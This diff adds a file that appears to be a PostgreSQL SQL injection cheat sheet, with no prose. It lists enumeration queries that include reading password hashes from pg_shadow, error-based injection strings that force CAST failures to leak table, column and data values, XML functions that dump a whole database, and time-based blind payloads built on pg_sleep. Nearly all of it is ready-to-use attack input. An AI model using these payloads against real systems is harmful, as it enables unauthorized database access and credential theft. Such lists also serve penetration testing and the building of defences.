@@ -1,0 +1,52 @@
+Single-Line Comment	--
+Multi-Line Comment	/**/
+DBMS version	SELECT version()
+Database Name	SELECT CURRENT_DATABASE()
+Database Schema	SELECT CURRENT_SCHEMA()
+List PostgreSQL Users	SELECT usename FROM pg_user
+List Password Hashes	SELECT usename, passwd FROM pg_shadow
+List DB Administrators	SELECT usename FROM pg_user WHERE usesuper IS TRUE
+Current User	SELECT user;
+Current User	SELECT current_user;
+Current User	SELECT session_user;
+Current User	SELECT usename FROM pg_user;
+Current User	SELECT getpgusername();
+List Schemas	SELECT DISTINCT(schemaname) FROM pg_tables
+List Databases	SELECT datname FROM pg_database
+List Tables	SELECT table_name FROM information_schema.tables
+List Tables	SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'
+List Tables	SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'
+List Columns	SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
+
+
+CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
+CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
+CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
+CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
+' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
+' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
+SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
+SELECT database_to_xml(true,true,''); -- dump the current database to XML
+SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
+
+
+
+
+
+
+
+
+
+
+
+select 1 from pg_sleep(5)
+;(select 1 from pg_sleep(5))
+||(select 1 from pg_sleep(5))
+select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
+AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
+AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
+AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
